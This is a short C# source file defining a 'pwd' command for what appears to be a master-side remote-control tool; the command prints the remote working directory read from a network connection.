using System;
using System.Collections.Generic;

namespace Master.Commands.Core
{
    internal class PWD : IMasterCommand
    {
        public string name { get; set; } = "pwd";

        public string description { get; set; } = "Display the remote current working directory";

        public bool isLocal { get; set; } = false;

        public List<string> validArguments { get; set; } = null;

        public void Process(List<string> args)
            => Console.WriteLine(MasterCommandsManager.networkManager.ReadLine());
    }
}
